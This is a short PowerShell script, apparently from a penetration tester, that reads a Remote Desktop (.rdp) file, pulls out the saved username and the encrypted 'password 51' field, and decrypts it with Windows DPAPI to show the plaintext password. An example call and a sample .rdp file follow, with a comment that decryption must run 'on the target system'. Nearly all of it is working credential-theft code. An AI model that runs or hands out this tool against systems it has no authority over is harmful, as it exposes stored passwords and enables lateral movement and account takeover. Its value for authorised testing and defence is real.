# Author: Scott Sutherland, NetSPI (@_nullbind / nullbind)

function Get-RdpCredentials {
    param (
        [Parameter(Mandatory = $true)]
        [string]$FilePath
    )

    # Check if the file exists
    if (-not (Test-Path -Path $FilePath)) {
        Write-Error "File not found: $FilePath"
        return
    }

    # Read the RDP file contents
    $rdpContent = Get-Content -Path $FilePath

    # Initialize variables to store username and password
    $username = ""
    $encryptedPassword = ""
    $decryptedPassword = ""

    # Parse the RDP file for username and encrypted password fields
    foreach ($line in $rdpContent) {
        if ($line -match "^username:s:(.+)$") {
            $username = $matches[1]
        }
        if ($line -match "^password 51:b:(.+)$") {
            $encryptedPassword = $matches[1]
        }
    }

    # Attempt to decrypt the password if it exists
    if ($encryptedPassword) {
        try {
            # Convert the encrypted password from Base64 to byte array
            $passwordBytes = [Convert]::FromBase64String($encryptedPassword)

            # Use DPAPI to decrypt the password
            $decryptedPassword = [System.Text.Encoding]::Unicode.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($passwordBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
        } catch {
            Write-Warning "Unable to decrypt password: $_"
            $decryptedPassword = "Unable to decrypt"
        }
    } else {
        $encryptedPassword = "No password found"
        $decryptedPassword = "No password found"
    }

    # Create a PowerShell object to return the results
    $result = [PSCustomObject]@{
        Username           = $username
        EncryptedPassword  = $encryptedPassword
        DecryptedPassword  = $decryptedPassword
    }

    return $result
}


# Example usage:
$credentials = Get-RdpCredentials -FilePath "c:\temp\configs\example.rdp"
$credentials


<# example.rdp - decryption needs to be done on the target system using dpapi

screen mode id:i:2
desktopwidth:i:1920
desktopheight:i:1080
session bpp:i:32
winposstr:s:0,3,0,0,800,600
full address:s:yourserver.com
username:s:YourUsername
password 51:b:encrypted_password_value


#>